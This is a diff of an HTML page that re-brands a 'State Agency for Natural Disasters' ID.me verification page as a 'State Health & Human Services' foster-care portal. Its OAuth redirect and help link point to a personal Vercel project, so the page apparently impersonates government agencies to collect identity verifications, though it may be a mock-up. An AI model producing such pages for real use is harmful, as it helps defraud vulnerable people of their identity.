@@ -3,8 +3,8 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>State Agency for Natural Disasters</title>
-  <!-- Google Fonts for better typography -->
+  <title>State Health and Human Services - Foster Care & Child Welfare</title>
+  <!-- Google Fonts for typography -->
   <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap" rel="stylesheet">
   <style>
     /* Global Styles */
@@ -12,18 +12,19 @@
       font-family: 'Roboto', sans-serif;
       margin: 0;
       padding: 0;
-      background-color: #f4f6f9;
+      background-color: #f9fafc;
       color: #333;
       display: flex;
       flex-direction: column;
       min-height: 100vh;
     }
     header {
-      background-color: #004080;
+      background: url('https://source.unsplash.com/1600x400/?family,children') center/cover no-repeat;
       color: #fff;
       text-align: center;
-      padding: 1rem 0;
+      padding: 2.5rem 1rem;
       font-size: 1.5rem;
+      text-shadow: 0px 2px 4px rgba(0, 0, 0, 0.5);
     }
     main {
       flex: 1;
@@ -31,7 +32,15 @@
       text-align: center;
     }
     h1 {
+      color: #004080;
       margin-bottom: 1rem;
+      font-size: 2rem;
+    }
+    p {
+      font-size: 1.1rem;
+      line-height: 1.6;
+      margin-bottom: 2rem;
+      color: #555;
     }
     .button-container {
       margin-top: 2rem;
@@ -57,30 +66,51 @@
       text-align: center;
       padding: 1rem 0;
     }
+    .image-section {
+      display: flex;
+      justify-content: center;
+      gap: 1rem;
+      margin: 2rem 0;
+    }
+    .image-section img {
+      width: 100%;
+      max-width: 300px;
+      height: auto;
+      border-radius: 10px;
+      box-shadow: 0px 4px 6px rgba(0, 0, 0, 0.2);
+    }
   </style>
 </head>
 <body>
 
   <!-- Header -->
   <header>
-    <h1>State Agency for Natural Disasters</h1>
-    <p>Your trusted resource for emergency verification and services</p>
+    <h1>State Health & Human Services</h1>
+    <p>Supporting Families, Protecting Children, Building Stronger Communities</p>
   </header>
 
   <!-- Main Content -->
   <main>
-    <h1>Verify Your Identity to Access Resources</h1>
-    <p>Please verify your identity through ID.me to access state assistance programs and disaster recovery resources.</p>
+    <h1>Access Foster Care and Child Welfare Resources</h1>
+    <p>
+      If you are a caregiver, family member, or caseworker seeking resources for foster care or child welfare services, please verify your identity through ID.me.  
+      This verification ensures secure access to critical programs and resources.
+    </p>
+
+    <!-- Image Section -->
+    <div class="image-section">
+      <img src="https://source.unsplash.com/300x200/?child,parent" alt="Child and Parent">
+      <img src="https://source.unsplash.com/300x200/?family,helping" alt="Helping Families">
+      <img src="https://source.unsplash.com/300x200/?children,support" alt="Children Support">
+    </div>
 
     <!-- Button Section -->
     <div class="button-container">
-      <!-- ID.me Verification Button -->
       <a href="https://api.id.me/oauth/authorize?client_id=28bf5c72de76f94a5fb1d9454e347d4e&redirect_uri=https://idme-auth-justjacob77s-projects.vercel.app/callback.html&response_type=code&scope=login" 
          class="idme-button">
         Verify with ID.me
       </a>
 
-      <!-- Help Button -->
       <a href="https://idme-auth-justjacob77s-projects.vercel.app/help" 
          class="idme-button" style="background-color: #6c757d;">
         Learn More
@@ -90,7 +120,7 @@
 
   <!-- Footer -->
   <footer>
-    <p>&copy; 2024 State Agency for Natural Disasters. All rights reserved.</p>
+    <p>&copy; 2024 State Health & Human Services. All rights reserved.</p>
   </footer>
 
 </body>
